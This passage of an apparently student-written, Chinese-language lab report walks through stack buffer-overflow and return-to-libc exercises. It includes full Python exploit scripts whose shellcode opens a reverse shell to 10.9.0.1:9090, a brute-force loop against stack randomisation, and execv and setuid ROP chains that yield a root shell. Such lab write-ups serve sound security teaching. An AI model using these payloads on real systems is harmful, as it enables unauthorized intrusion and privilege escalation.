32-bit address and 8 for 64-bit address</span></span><br><span class="line"><span class="keyword">for</span> offset <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>,<span class="number">304</span>,<span class="number">4</span>):</span><br><span class="line">   <span class="built_in">print</span>(offset)</span><br><span class="line">   content[offset:offset + <span class="number">4</span>] = (ret).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>) </span><br><span class="line"><span class="comment">##################################################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Write the content to a file</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;badfile&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(content)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="task4"><a href="#task4" class="headerlink" title="task4"></a>task4</h1><p>这里我采用了一种比较特殊的方法。注意到由于小端法程序中，0x00007faaaaaaaaaa…的表示形式其实是(0xaa)(0xaa)(0xaa)(0xaa)(0xaa)(0xaa)(0x7f)(0x00)，因此实际上如果我们在返回地址只放一个7f开头的地址，被截断之后仍然是00开头的数据。因此这道题就和第三题很像了。我们要做的是</p><ol><li>把shellcode读入buffer(这里的buffer够长)</li><li>返回地址精确的写为shellcode的起始位置</li><li>offset可以用程序给我们的输出减一下，得到那里是返回地址的offset</li></ol><blockquote><p>我知道这题还有别的方法，利用main中的read，只是这里用了别的方法[doge]助教手下留情</p></blockquote><p>这里是运行结果截图。</p><p><img src="/2022/03/09/software-security-lab1/image-20220310105720567.png" alt="image-20220310105720567"></p><p>以下是程序原本的输出，以及exp</p><p><img src="/2022/03/09/software-security-lab1/image-20220310105729364.png" alt="image-20220310105729364"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">shellcode = (</span><br><span class="line">   <span class="string">&quot;\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48&quot;</span></span><br><span class="line">   <span class="string">&quot;\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48&quot;</span></span><br><span class="line">   <span class="string">&quot;\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31&quot;</span></span><br><span class="line">   <span class="string">&quot;\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff&quot;</span></span><br><span class="line">   <span class="string">&quot;/bin/bash*&quot;</span></span><br><span class="line">   <span class="string">&quot;-c*&quot;</span></span><br><span class="line">   <span class="comment"># You can modify the following command string to run any command.</span></span><br><span class="line">   <span class="comment"># You can even run multiple commands. When you change the string,</span></span><br><span class="line">   <span class="comment"># make sure that the position of the * at the end doesn&#x27;t change.</span></span><br><span class="line">   <span class="comment"># The code above will change the byte at this position to zero,</span></span><br><span class="line">   <span class="comment"># so the command string ends here.</span></span><br><span class="line">   <span class="comment"># You can delete/add spaces, if needed, to keep the position the same. </span></span><br><span class="line">   <span class="comment"># The * in this line serves as the position marker         * </span></span><br><span class="line">   <span class="string">&quot;/bin/bash -i &gt; /dev/tcp/10.9.0.1/9090 0&lt;&amp;1 2&gt;&amp;1           *&quot;</span></span><br><span class="line">   <span class="string">&quot;AAAAAAAA&quot;</span>   <span class="comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span></span><br><span class="line">   <span class="string">&quot;BBBBBBBB&quot;</span>   <span class="comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span></span><br><span class="line">   <span class="string">&quot;CCCCCCCC&quot;</span>   <span class="comment"># Placeholder for argv[2] --&gt; the command string</span></span><br><span class="line">   <span class="string">&quot;DDDDDDDD&quot;</span>   <span class="comment"># Placeholder for argv[3] --&gt; NULL</span></span><br><span class="line">).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Fill the content with NOP&#x27;s</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0x90</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">517</span>)) </span><br><span class="line"></span><br><span class="line"><span class="comment">##################################################################</span></span><br><span class="line"><span class="comment"># Put the shellcode somewhere in the payload</span></span><br><span class="line">start = <span class="number">0</span>               <span class="comment"># Change this number </span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(shellcode))</span><br><span class="line">content[start:start + <span class="built_in">len</span>(shellcode)] = shellcode</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decide the return address value </span></span><br><span class="line"><span class="comment"># and put it somewhere in the payload</span></span><br><span class="line">ret    = <span class="number">0x00007fffffffe580</span>    <span class="comment"># Change this number </span></span><br><span class="line">offset = <span class="number">208</span>+<span class="number">8</span>              <span class="comment"># Change this number </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Use 4 for 32-bit address and 8 for 64-bit address</span></span><br><span class="line">content[offset:offset + <span class="number">8</span>] = (ret).to_bytes(<span class="number">8</span>,byteorder=<span class="string">&#x27;little&#x27;</span>) </span><br><span class="line"><span class="comment">##################################################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Write the content to a file</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;badfile&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(content)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="task5"><a href="#task5" class="headerlink" title="task5"></a>task5</h1><p>这道题给了比较小的buffer长度，并且是64位的。我们不能把shellcode全部写在buffer上，因此必须想办法绕过这里的\x00的限制。</p><p>注意到main函数中fread会将我们的输入完全读入，fread不会被\x00截断，因此可以用fread里面的地址来当作我们的返回地址。</p><p><strong>那么怎么计算呢?</strong>  如下所示，我们首先在buffer前面输入一段abcdeaaa作为测试，通过pwndbg中的search命令能够找到在栈上存在两个地址。其中d810结尾的便是fread读入的地址，可以包含00。由此我们可以计算出两者的偏移。计算的结果是0x490</p><p><img src="/2022/03/09/software-security-lab1/image-20220310124441714.png" alt="image-20220310124441714"></p><p>得到偏移之后，我们只需要把返回地址减去我们的偏移量，就能得到<strong>fread读取的带有\x00的地址了</strong>。</p><p>计算可以表示为：0x00007fffffffe5f0+0x000490。在下面的代码中我加上112的原因是，由于可以有一段nop链，如果我们计算的偏移有一点误差也没有关系，所以我把shellcode放在了buffer开始位置稍微后面一点的位置。</p><p><img src="/2022/03/09/software-security-lab1/image-20220310124722231.png" alt="image-20220310124722231"></p><p>以下位反向shell成功连接之后的截图。</p><p><img src="/2022/03/09/software-security-lab1/image-20220310124416061.png" alt="image-20220310124416061"></p><p>以下为攻击代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">shellcode = (</span><br><span class="line">   <span class="string">&quot;\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48&quot;</span></span><br><span class="line">   <span class="string">&quot;\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48&quot;</span></span><br><span class="line">   <span class="string">&quot;\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31&quot;</span></span><br><span class="line">   <span class="string">&quot;\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff&quot;</span></span><br><span class="line">   <span class="string">&quot;/bin/bash*&quot;</span></span><br><span class="line">   <span class="string">&quot;-c*&quot;</span></span><br><span class="line">   <span class="comment"># You can modify the following command string to run any command.</span></span><br><span class="line">   <span class="comment"># You can even run multiple commands. When you change the string,</span></span><br><span class="line">   <span class="comment"># make sure that the position of the * at the end doesn&#x27;t change.</span></span><br><span class="line">   <span class="comment"># The code above will change the byte at this position to zero,</span></span><br><span class="line">   <span class="comment"># so the command string ends here.</span></span><br><span class="line">   <span class="comment"># You can delete/add spaces, if needed, to keep the position the same. </span></span><br><span class="line">   <span class="comment"># The * in this line serves as the position marker         * </span></span><br><span class="line">   <span class="string">&quot;/bin/bash -i &gt; /dev/tcp/10.9.0.1/9090 0&lt;&amp;1 2&gt;&amp;1           *&quot;</span></span><br><span class="line">   <span class="string">&quot;AAAAAAAA&quot;</span>   <span class="comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span></span><br><span class="line">   <span class="string">&quot;BBBBBBBB&quot;</span>   <span class="comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span></span><br><span class="line">   <span class="string">&quot;CCCCCCCC&quot;</span>   <span class="comment"># Placeholder for argv[2] --&gt; the command string</span></span><br><span class="line">   <span class="string">&quot;DDDDDDDD&quot;</span>   <span class="comment"># Placeholder for argv[3] --&gt; NULL</span></span><br><span class="line">).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">jmp_rsp=(<span class="string">&quot;\xff\xe4&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Fill the content with NOP&#x27;s</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0x90</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">517</span>)) </span><br><span class="line"></span><br><span class="line"><span class="comment">##################################################################</span></span><br><span class="line"><span class="comment"># Put the shellcode somewhere in the payload</span></span><br><span class="line">start = <span class="number">112</span>               <span class="comment"># Change this number </span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(shellcode))</span><br><span class="line">content[start:start + <span class="built_in">len</span>(shellcode)] = shellcode</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decide the return address value </span></span><br><span class="line"><span class="comment"># and put it somewhere in the payload</span></span><br><span class="line">ret    = <span class="number">0x00007fffffffe5f0</span>+<span class="number">0x000490</span>+<span class="number">112</span>    <span class="comment"># Change this number to ret place+8</span></span><br><span class="line">offset = <span class="number">104</span>             <span class="comment"># Change this number </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Use 4 for 32-bit address and 8 for 64-bit address</span></span><br><span class="line">content[offset:offset + <span class="number">8</span>] = (ret).to_bytes(<span class="number">8</span>,byteorder=<span class="string">&#x27;little&#x27;</span>) </span><br><span class="line"><span class="comment">##################################################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Write the content to a file</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;badfile&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(content)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="task6"><a href="#task6" class="headerlink" title="task6"></a>task6</h1><p>这里直接利用的是task1的代码，略加修改，增加了大量的nop，并不是精确跳转，使得我们暴力搜索的成功概率大大增加。</p><p><img src="/2022/03/09/software-security-lab1/image-20220310143123093.png" alt="image-20220310143123093"></p><p>以下位暴力搜索的代码。由于start位于较为靠后的位置，相比于原来的level-1，可以有更多的nop供滑动，有更大的概率getshell。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">shellcode = (</span><br><span class="line">   <span class="string">&quot;\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b&quot;</span></span><br><span class="line">   <span class="string">&quot;\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54&quot;</span></span><br><span class="line">   <span class="string">&quot;\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff&quot;</span></span><br><span class="line">   <span class="string">&quot;/bin/bash*&quot;</span></span><br><span class="line">   <span class="string">&quot;-c*&quot;</span></span><br><span class="line">   <span class="comment"># You can modify the following command string to run any command.</span></span><br><span class="line">   <span class="comment"># You can even run multiple commands. When you change the string,</span></span><br><span class="line">   <span class="comment"># make sure that the position of the * at the end doesn&#x27;t change.</span></span><br><span class="line">   <span class="comment"># The code above will change the byte at this position to zero,</span></span><br><span class="line">   <span class="comment"># so the command string ends here.</span></span><br><span class="line">   <span class="comment"># You can delete/add spaces, if needed, to keep the position the same. </span></span><br><span class="line">   <span class="comment"># The * in this line serves as the position marker         * </span></span><br><span class="line">   <span class="string">&quot;/bin/bash -i &gt; /dev/tcp/10.9.0.1/9090 0&lt;&amp;1 2&gt;&amp;1           *&quot;</span></span><br><span class="line">   <span class="string">&quot;AAAA&quot;</span>   <span class="comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span></span><br><span class="line">   <span class="string">&quot;BBBB&quot;</span>   <span class="comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span></span><br><span class="line">   <span class="string">&quot;CCCC&quot;</span>   <span class="comment"># Placeholder for argv[2] --&gt; the command string</span></span><br><span class="line">   <span class="string">&quot;DDDD&quot;</span>   <span class="comment"># Placeholder for argv[3] --&gt; NULL</span></span><br><span class="line">).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Fill the content with NOP&#x27;s</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0x90</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">517</span>)) </span><br><span class="line"></span><br><span class="line"><span class="comment">##################################################################</span></span><br><span class="line"><span class="comment"># Put the shellcode somewhere in the payload</span></span><br><span class="line">start = <span class="number">340</span>               <span class="comment"># Change this number </span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(shellcode))</span><br><span class="line">content[start:start + <span class="built_in">len</span>(shellcode)] = shellcode</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decide the return address value </span></span><br><span class="line"><span class="comment"># and put it somewhere in the payload</span></span><br><span class="line">ret    = <span class="number">0xffffd7ac</span>    <span class="comment"># Change this number </span></span><br><span class="line"><span class="comment"># offset = 116              # Change this number </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Use 4 for 32-bit address and 8 for 64-bit address</span></span><br><span class="line"><span class="keyword">for</span> offset <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>,<span class="number">304</span>,<span class="number">4</span>):</span><br><span class="line">   <span class="built_in">print</span>(offset)</span><br><span class="line">   content[offset:offset + <span class="number">4</span>] = (ret).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>) </span><br><span class="line"><span class="comment">##################################################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Write the content to a file</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;badfile&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(content)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="task7"><a href="#task7" class="headerlink" title="task7"></a>task7</h1><h2 id="random-stack"><a href="#random-stack" class="headerlink" title="random_stack"></a>random_stack</h2><p>如果栈地址随机化，可以看到我们每次运行binary输出的buffer位置和ebp位置都会发生变化。具体原因在内核实现，这里就不深入讨论了。<strong>栈随机化让我们难以直接预测栈地址，尤其是在64位情况下，有5byte的数据发生了随机化，更是加大了爆破的难度</strong>(之前32位情况下栈地址随机化的爆破在task6已经做到)</p><p><img src="/2022/03/09/software-security-lab1/image-20220310124900538.png" alt="image-20220310124900538"></p><p><img src="/2022/03/09/software-security-lab1/image-20220310124931399.png" alt="image-20220310124931399"></p><h2 id="canary"><a href="#canary" class="headerlink" title="canary"></a>canary</h2><p>如果在编译选项中开启了栈保护者选项，运行我们的exp，将得到如下的输出</p><p><img src="/2022/03/09/software-security-lab1/image-20220310130040152.png" alt="image-20220310130040152"></p><p>通过回顾上课所讲的知识，知道栈保护者实际上是一种位于返回地址之前的随机数，在每次从调用栈返回的时候，都会检查这个随机数的数值有没有被修改过，如果修改过，就说明可能发生了栈溢出，从而报错。</p><p>我们看一下IDA反汇编得到的代码，下面是检验是否有canary的部分。</p><p><img src="/2022/03/09/software-security-lab1/image-20220310132431015.png" alt="image-20220310132431015"></p><p>在退出当前函数栈帧之前，首先把[ebp+0xc]中的内容放到edx，之后和一个内存中的位置比较，如果xor的结果为0，就说明两者相同，栈没有被覆盖，否则说明栈遭到了破坏，于是跳转到stack_check_fail中。</p><h1 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h1><h2 id="查找关键函数"><a href="#查找关键函数" class="headerlink" title="查找关键函数"></a>查找关键函数</h2><p>直接在gdb中搜索相应函数名就能获得地址。</p><p><img src="/2022/03/09/software-security-lab1/image-20220310144400814.png" alt="image-20220310144400814"></p><h2 id="插入-bin-sh"><a href="#插入-bin-sh" class="headerlink" title="插入/bin/sh"></a>插入/bin/sh</h2><p>按照pdf中的做法，在当前开启的shell中插入/bin/sh，并通过编写pdf中的脚本获取MYSHELL的地址。这里注意文件名必须要也是6个字符，否则会导致偏移出现问题。</p><p><img src="/2022/03/09/software-security-lab1/image-20220310210713711.png" alt="image-20220310210713711"></p><h2 id="Ret2shell"><a href="#Ret2shell" class="headerlink" title="Ret2shell"></a>Ret2shell</h2><p>这里需要调用system(“/bin/sh”)即可。system可以用上面”插入关键函数”找到的地址，/bin/sh字符串地址就是环境变量中此字符串地址。如下图所示。我们要做的是</p><ol><li>将ret地址写成system</li><li>将ret+4的地址写为exit（起始写成什么不重要，后面也会说明）</li><li>ret+8写上/bin/sh字符串的<strong>地址</strong></li></ol><p>为什么这么写？这是x86站调用顺序决定的。</p><p><img src="/2022/03/09/software-security-lab1/image-20220310151418402.png" alt="image-20220310151418402"></p><p><img src="/2022/03/09/software-security-lab1/image-20220310162753250.png" alt="image-20220310162753250"></p><h3 id="修改文件名"><a href="#修改文件名" class="headerlink" title="修改文件名"></a>修改文件名</h3><p>当我们把上面的payload用于修改完文件名的binary之后，发现打不通了。<strong>其实原因很简单，就是环境变量中文件名部分多了一个字符，导致我们的/bin/sh偏移发生了变化</strong>。</p><p><img src="/2022/03/09/software-security-lab1/image-20220310162917492.png" alt="image-20220310162917492"></p><h3 id="exit是否有关？"><a href="#exit是否有关？" class="headerlink" title="exit是否有关？"></a>exit是否有关？</h3><p>答：没有关系。因为system(“/bin/sh”)默认执行成功之后永不返回。因此system的返回地址是什么不重要，一旦执行成功也不会跳转到返回地址，而一旦执行不成功，返回了也是报错。</p><h2 id="call-execv"><a href="#call-execv" class="headerlink" title="call execv"></a>call execv</h2><p><img src="/2022/03/09/software-security-lab1/image-20220327093211644.png" alt="image-20220327093211644"></p><p><img src="/2022/03/09/software-security-lab1/image-20220310214546089.png" alt="image-20220310214546089"></p><p><img src="/2022/03/09/software-security-lab1/image-20220310184858255.png" alt="image-20220310184858255"></p><p>如上所示。但是最终没有成功拿到shell，不知道为什么。</p><blockquote><p>后记：看完setuid部分中网上的方法，想到了这里也可以进行栈迁移。下面为尝试过程。</p></blockquote><p>我们使用gdb调试得到如下结果。</p><p><img src="/2022/03/09/software-security-lab1/image-20220317105410920.png" alt="image-20220317105410920"></p><p>经过一个栈迁移，得到如下结果。可以看到已经符合调用execv的条件了。</p><p><img src="/2022/03/09/software-security-lab1/image-20220317124505929.png" alt="image-20220317124505929"></p><p>下面是成功截图。可以看到euid部分已经被成功设置为0，也就是说我们具有了root能够做到的访问资源的权限。</p><p><img src="/2022/03/09/software-security-lab1/image-20220327100243802.png" alt="image-20220327100243802"></p><p>代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># exec.py</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Fill content with non-zero values</span></span><br><span class="line">content =<span class="built_in">bytearray</span>(<span class="number">0xaa</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">300</span>)) <span class="comment"># fill the rest 0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(debug == <span class="number">1</span>):</span><br><span class="line">    main_stack = <span class="number">0xffffcce0</span></span><br><span class="line">    binsh = <span class="number">0xffffd3d7</span></span><br><span class="line">    p_addr = <span class="number">0xffffd3f6</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    main_stack = <span class="number">0xffffcd50</span></span><br><span class="line">    binsh = <span class="number">0xffffd3c3</span></span><br><span class="line">    p_addr = <span class="number">0xffffd42c</span></span><br><span class="line"></span><br><span class="line">A = <span class="number">0x1c</span>+<span class="number">12</span></span><br><span class="line">argv = main_stack + <span class="number">0x1c</span> + <span class="number">16</span>   <span class="comment"># where usable stack start</span></span><br><span class="line">content[A:A+<span class="number">4</span>] = (argv).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line">Z = <span class="number">0x1c</span>+<span class="number">8</span></span><br><span class="line"><span class="comment"># binsh = 0xffffd3c3     # The address of &quot;/bin/sh&quot;</span></span><br><span class="line">content[Z:Z+<span class="number">4</span>] = (binsh).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line">X = <span class="number">0x1c</span></span><br><span class="line">execv_addr = <span class="number">0xf7e994b0</span>      <span class="comment"># The address of execv</span></span><br><span class="line">content[X:X+<span class="number">4</span>] = (execv_addr).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line">X1 = <span class="number">0x1c</span> + <span class="number">4</span></span><br><span class="line">exit_addr = <span class="number">0xf7e04f80</span>       <span class="comment"># The address of exit</span></span><br><span class="line">content[X1:X1+<span class="number">4</span>] = (exit_addr).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line">arg = <span class="number">0x1c</span>+<span class="number">16</span></span><br><span class="line">argv1 = binsh</span><br><span class="line">argv3 = <span class="number">0</span></span><br><span class="line">content[arg:arg+<span class="number">4</span>] = (argv1).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">content[arg+<span class="number">4</span>:arg+<span class="number">8</span>] = (p_addr).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">content[arg+<span class="number">8</span>:arg+<span class="number">12</span>] = (argv3).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Save content to a file</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;badfile&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(content)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="setuid"><a href="#setuid" class="headerlink" title="setuid"></a>setuid</h2><p>终于到了ROP的最后一个task(哭)但是我不会做(0 - 0)</p><p>因为这里又牵涉到把strcpy的截断符号\x00当作参数，应该需要一些特殊的构造方法，我太菜了。</p><p>于是上网参考了<a href="https://www.anquanke.com/post/id/258025#h2-4">这篇文章</a>，就当学习一下好了。</p><blockquote><p>我也有想到按照提示，用fread的结果作为换掉的栈，但是也没找到xchg,(),exp这样的gadget。看了别人的wp</p></blockquote><p>可以看到程序首先执行的是pop ecx，把栈顶的数值弹出，放进ecx。同时再pop三个寄存器</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pop ecx ; pop ebx ; pop ebp ; lea esp, [ecx - <span class="number">4</span>] ; ret</span><br></pre></td></tr></table></figure><p>在ecx寄存器位置，我们放上<code>main_buffer+ 0x1c + 4*5</code>。这里是setuid_addr的后一条指令位置。为什么放后一条指令?因为后面ecx-4会将-4的位置返还给esp，因此我们需要放setuid_addr后面的地址。<strong>同时，通过这样的操作，我们已经成功把栈转移到main中buffer的栈帧中去</strong>，因此此时setuid（0）便不会被截断。接着就是之前一样的操作，setuid，之后system(“/bin/sh”)即可。</p><p>这里比较巧妙的就是通过上面的gadget进行栈迁移，我ROP果然太菜了。</p><p><img src="/2022/03/09/software-security-lab1/image-20220310214927605.png" alt="image-20220310214927605"></p><p>以下为getshell截图。</p><p><img src="/2022/03/09/software-security-lab1/image-20220311001156543.png" alt="image-20220311001156543"></p><p>下面是成功代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 